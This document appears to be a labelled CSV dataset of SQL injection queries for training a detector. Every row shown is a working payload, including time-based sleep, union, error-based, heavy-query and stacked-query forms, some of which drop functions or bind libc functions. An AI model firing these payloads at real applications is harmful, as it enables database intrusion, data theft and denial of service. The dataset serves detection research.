Query,Label
"1') as hwpf where 5603=5603;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1
1%')));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,1
1'+(select 'kiqf' where 5920=5920;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,1
"1) as ewnv where 3393=3393 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
1');select pg_sleep(5) and ('vnss' like 'vnss,1
"-5207"" where 2050=2050 union all select 2050,2050,2050,2050,2050,2050,2050--",1
1' in boolean mode) and 5981=6700,1
"1%"")));select (case when (5290=1720) then 5290 else 1/(select 0) end)--",1
"1"") where 9511=9511 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",1
"-3368')) union all select 4913,4913,4913,4913,4913,4913,4913,4913,4913--",1
"1"";select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
"1'||(select 'tkmc' from dual where 9675=9675 union all select null,null,null,null--",1
-8722%' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and '%'=',1
"1"")));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (((""dskh""=""dskh",1
1') and (select * from (select(sleep(5)))gcrr)#,1
1'));select (case when (5856=7176) then 5856 else cast(1 as int)/(select 0 from dual) end) from dual--,1
"1'+(select dklk where 9862=9862 union all select null,null,null,null,null,null--",1
"1' and 3824=benchmark(5000000,md5(0x76555642)) and 'vmuj' like 'vmuj",1
"1' or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and 'uwep'='uwep",1
"1')) as fcjk where 7755=7755;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",1
"1' in boolean mode) and make_set(7804=3315,3315)#",1
1 where 5828=5828 and (3020=3020)*6703--,1
"-2782')) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
"-8976%""))) union all select 5146,5146,5146,5146,5146,5146,5146,5146--",1
1') and 3560=5467--,1
"1))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (((7813=7813",1
"1"");call regexp_substring(repeat(right(char(3702),0),500000000),null) and (""nwjv""=""nwjv",1
"1"";select case when 7717=7717 then 1 else null end--",1
"1%' union all select null,null,null,null#",1
"1') as mvai where 5856=5856 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",1
"1' or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and 'rhzy'='rhzy",1
"1"") where 3958=3958 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
1')) and sleep(5)#,1
"1"" and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ""nzgn""=""nzgn",1
"-2701"")) as wvht where 5401=5401 union all select 5401,5401,5401,5401,5401,5401,5401,5401#",1
1'+(select 'lpkv' where 8760=8760;if(7899=7899) select 7899 else drop function zbbp--,1
"-3013') where 2027=2027 union all select 2027,2027,2027,2027--",1
"1%""))) or 8421=(select count(*) from generate_series(1,5000000)) and (((""%""=""",1
"1'||(select 'fjlg' from dual where 9517=9517;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
"1' or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"1))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((4744=4744",1
1'+(select 'toec' where 5810=5810 and sleep(5))+',1
1) as nwfz where 7365=7365 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,1
"1'||(select 'ojdz' where 7350=7350 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))||'",1
"1"") where 9447=9447;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
-1711) where 9098=9098 order by 1#,1
"1' where 6147=6147 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",1
"1""));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ((""tbcc""=""tbcc",1
"1"") or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
1') and sleep(5),1
1 or sleep(5)#,1
1) as bozx where 2160=2160 and sleep(5)#,1
1%');select (case when (3773=3722) then 3773 else 3773*(select 3773 from mysql.db) end)#,1
1'+(select tart where 9861=9861;begin dbms_lock.sleep(5); end--,1
"1""))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (((""obau""=""obau",1
1'));begin user_lock.sleep(5); end and (('vcaf' like 'vcaf,1
"1') and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",1
"1'||(select 'kyhs' from dual where 9491=9491;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1
"1"") union all select null,null,null,null#",1
1%') union all select null#,1
"1"") as bpmk where 4506=4506;select (case when (3855=3855) then 3855 else 1/(select 0) end)--",1
"1')) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('bmbt'='bmbt",1
"1"")) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((""lazm"" like ""lazm",1
"1'+(select kfmv where 1679=1679;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual)+'",1
"-4093')) union all select 5785,5785,5785#",1
"1%"")));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
"1) as tgqd where 6369=6369 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1
"1"" (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ""owzc"" like ""owzc",1
"1;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1
"1' in boolean mode);select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
"1')) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
"1"" where 3764=3764;iif(4460=1610,1,1/0)",1
"1)) as berd where 5803=5803 union all select null,null,null,null,null,null,null--",1
"-4152"") where 9781=9781 union all select 9781,9781,9781,9781,9781--",1
"1"")));begin dbms_lock.sleep(5); end--",1
"1%"" union all select null,null,null,null,null,null,null,null,null,null#",1
"1%"") union all select null,null,null,null,null--",1
"1"")));select sleep(5) and (((""lczw""=""lczw",1
1' in boolean mode) and (3020=3020)*6703#,1
"1'))) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ((('sjxp' like 'sjxp",1
"-6527')) union all select 5053,5053,5053,5053--",1
"1,(select (case when (5217=5217) then 1 else 5217*(select 5217 from mysql.db) end))",1
"1') where 2121=2121 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
1' in boolean mode);if(7899=7899) select 7899 else drop function zbbp--,1
-9771' or 5113=5365,1
"1);select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (8535=8535",1
"1'+(select nvht where 9118=9118 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))+'",1
"1' in boolean mode) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))#",1
-3578'))) order by 1--,1
1')) and 2832=4165--,1
"1"") union all select null,null,null,null,null,null,null--",1
"1%' and 2388=benchmark(5000000,md5(0x6d457153))#",1
-8716') where 5523=5523 or 3686=8485--,1
"1) as lfra where 2669=2669 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",1
"1"") as idwa where 2545=2545 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
"-7764"" or 7308=7805",1
"1"") as hsws where 6656=6656;waitfor delay '0:0:5'--",1
1' and sleep(5) and 'kapr'='kapr,1
"-7686%"") or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
"-4756%')) union all select 7824,7824,7824,7824,7824,7824,7824,7824#",1
"-7337"" union all select 7294,7294,7294,7294,7294,7294,7294,7294,7294,7294--",1
"1%"";iif(1878=2513,1,1/0)",1
1%')) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('%'=',1
"1 where 4468=4468 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"1%')) and elt(4483=5364,5364) and (('%'='",1
"-9881"")) or 9850=8118#",1
"1'))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ((('ejul'='ejul",1
1)) as fpej where 6790=6790 and (3020=3020)*6703--,1
-9014' order by 1--,1
"1))) or 8514=benchmark(5000000,md5(0x544d5a4c))#",1
"1 where 2988=2988 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
-5854))) union all select 5645#,1
1'));(select * from (select(sleep(5)))srmq) and (('cbaj'='cbaj,1
"-8436') as frmf where 7225=7225 or make_set(9354=9354,7185)--",1
"1"") or (select * from (select(sleep(5)))ydpu) and (""cadh"" like ""cadh",1
"1%"") or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (""%""=""",1
"1' in boolean mode) or 8156=(select count(*) from generate_series(1,5000000))--",1
"1"") as nyzd where 5305=5305;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"-8771"")) union all select 6302,6302,6302,6302,6302#",1
"1""))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""djrh""=""djrh",1
"1';create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
"1'||(select 'uqbj' from dual where 6736=6736 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"1%"")) or 6793=(select 6793 from pg_sleep(5)) and ((""%""=""",1
1' where 7725=7725 or (select * from (select(sleep(5)))sddo)#,1
"1) where 2083=2083;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
-9950' or 4425=1975,1
1 where 8214=8214 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,1
"1'))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('kpsg' like 'kpsg",1
"1%"";select count(*) from generate_series(1,5000000) and ""%""=""",1
"1 where 6881=6881 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",1
"-3737%"" union all select 4452,4452,4452#",1
"1"" union all select null,null,null,null,null,null,null,null,null--",1
"1) union all select null,null,null,null,null,null--",1
"1'||(select 'goxu' where 9215=9215 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1
"-8159 where 2793=2793 union all select 2793,2793,2793,2793,2793#",1
"1"")) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((""mxnj"" like ""mxnj",1
"1',(select (case when (8596=8596) then 1 else 8596*(select 8596 from mysql.db) end))",1
"1) where 3076=3076 union all select null,null,null,null,null--",1
-5830') as fivy where 2173=2173 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--,1
-2527)) as oqpy where 7468=7468 or 3038=3038,1
"1%"")) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((""%""=""",1
"1"") as yggn where 1006=1006 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",1
"1%""))) and sleep(5)#",1
"-6733') where 4024=4024 union all select 4024,4024,4024,4024#",1
"1)));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
"1%""))) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",1
"1' and 8407=(select count(*) from generate_series(1,5000000))",1
"-8893) union all select 7594,7594,7594,7594,7594,7594#",1
"1%';call regexp_substring(repeat(right(char(3702),0),500000000),null) and '%'='",1
"1""))) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
"-5211"")) as bkvr where 4082=4082 or 2323=8052",1
"1') or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('lqql'='lqql",1
"1'));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (('bhlx' like 'bhlx",1
-9847%'))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('%'=',1
"1""))) waitfor delay '0:0:5' and (((""ckht""=""ckht",1
"1') and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
1%');select (case when (9986=8342) then 9986 else 9986*(select 9986 from information_schema.character_sets) end)#,1
"1' union all select null,null#",1
-9581) as jkqo where 5200=5200 or 6872=6872--,1
1')) and 6969=(select 6969 from pg_sleep(5)) and (('prjf'='prjf,1
"1' in boolean mode) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)#",1
1')) as tley where 3539=3539;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,1
1'+(select 'ozpm' where 6939=6939 rlike (select (case when (7689=7689) then 1 else 0x28 end)))+',1
1)) and 2886=1133--,1
"1"") where 7010=7010 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
"1')) as mjps where 2179=2179 union all select null,null,null,null,null,null,null--",1
1));select case when 7717=7717 then 1 else null end--,1
"1"")) as wfne where 8933=8933;select (case when (3855=3855) then 3855 else 1/(select 0) end)--",1
"-3068%"")) union all select 6597,6597,6597,6597,6597,6597,6597,6597--",1
"1',(begin if (8340=8340) then dbms_lock.sleep(5); else dbms_lock.sleep(0); end if; end;)",1
"1"")) as fapw where 4722=4722 union all select null,null,null,null,null,null,null,null,null,null#",1
"-4350"")) as mmwq where 9801=9801 or (8520=2834)*2834--",1
"1%"") or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""%""=""",1
"1%"" and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ""%""=""",1
"1');select count(*) from generate_series(1,5000000) and ('tnvm' like 'tnvm",1
"1"" and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
"1';select benchmark(5000000,md5(0x4c4d6142)) and 'fgcg'='fgcg",1
"1%' or 8421=(select count(*) from generate_series(1,5000000)) and '%'='",1
"1%"") and 3824=benchmark(5000000,md5(0x76555642)) and (""%""=""",1
"1"") where 2633=2633 union all select null,null,null,null#",1
"1"") as zhlf where 4119=4119 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
"1%"")) union all select null,null,null,null--",1
"1' and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and 'eovg' like 'eovg",1
"1')(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))",1
